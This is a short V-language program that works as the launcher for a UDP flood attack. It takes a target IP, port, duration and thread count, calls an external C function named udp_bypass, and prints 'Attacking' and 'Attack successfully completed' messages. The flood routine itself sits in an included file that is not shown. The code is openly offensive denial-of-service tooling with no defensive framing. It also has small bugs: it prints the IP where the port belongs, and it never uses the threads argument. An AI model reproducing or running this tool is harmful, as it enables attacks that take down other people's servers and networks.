import os
import time
#include "@VROOT/methods/udp.c"

fn C.udp_bypass(string, u16, int)

fn main() {
	mut args := os.args.clone()
	if args.len < 5 {
		println("[ X ] Error, Invalid argument.\r\nUsage: ${args[0]} <ip> <port> <time> <threads>")
		exit(0)
	}

	println("[+] Attacking ${args[1]}:${args[1]} for ${args[3]} seconds....!")

	udp_bypass(args[1], args[2].u16(), args[3].int())

	println("[ + ] Attack successfully completed.....!")
}